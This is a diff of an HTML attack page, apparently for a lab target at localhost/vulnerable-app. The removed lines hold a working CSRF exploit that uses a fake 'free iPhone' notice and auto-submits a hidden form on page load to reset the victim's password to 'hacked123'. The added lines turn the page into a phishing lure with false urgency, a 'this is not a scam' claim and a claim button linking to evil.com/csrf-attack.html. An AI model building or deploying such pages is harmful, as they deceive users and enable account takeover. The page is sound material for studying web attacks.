@@ -1,27 +1,77 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Win a Free Prize!</title>
-    <script>
-        function exploit() {
-            // Auto-submit the form after 3 seconds
-            setTimeout(function() {
-                document.getElementById('csrf-form').submit();
-            }, 3000);
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exclusive Offer!</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f5f5f5;
+            text-align: center;
+            padding: 40px;
+            color: #333;
         }
-    </script>
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+        }
+        .prize-image {
+            width: 200px;
+            margin: 20px auto;
+        }
+        .claim-button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 15px 32px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 20px 2px;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+        }
+        .claim-button:hover {
+            background-color: #45a049;
+        }
+        .small-text {
+            font-size: 12px;
+            color: #777;
+            margin-top: 30px;
+        }
+    </style>
 </head>
-<body onload="exploit()">
-    <h1>Congratulations! You won a free iPhone!</h1>
-    <p>Please wait while we process your reward...</p>
-    
-    <!-- Hidden CSRF Form -->
-    <form id="csrf-form" 
-          action="http://localhost/vulnerable-app/reset-password.php" 
-          method="POST" 
-          style="display:none;">
-        <input type="password" name="new_password" value="hacked123">
-        <input type="password" name="confirm_password" value="hacked123">
-    </form>
+<body>
+    <div class="container">
+        <h1>🎉 Congratulations! 🎉</h1>
+        <p>You've been selected for our exclusive reward program!</p>
+        
+        <div class="prize-image">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#FFD700" width="100px" height="100px">
+                <path d="M0 0h24v24H0z" fill="none"/>
+                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11V11.99z"/>
+            </svg>
+        </div>
+        
+        <h2>Claim Your Free iPhone 15 Pro!</h2>
+        <p>As a valued user, you've been randomly selected to receive our premium reward.</p>
+        <p><strong>Hurry! Offer expires in 5 minutes!</strong></p>
+        
+        <a href="http://evil.com/csrf-attack.html" class="claim-button">
+            CLICK HERE TO CLAIM YOUR PRIZE NOW
+        </a>
+        
+        <div class="small-text">
+            <p>By clicking above, you agree to our terms and conditions. Limited time offer. Only 3 prizes remaining.</p>
+            <p>This is not a scam. We are a legitimate reward service partnered with major tech companies.</p>
+        </div>
+    </div>
 </body>
 </html>
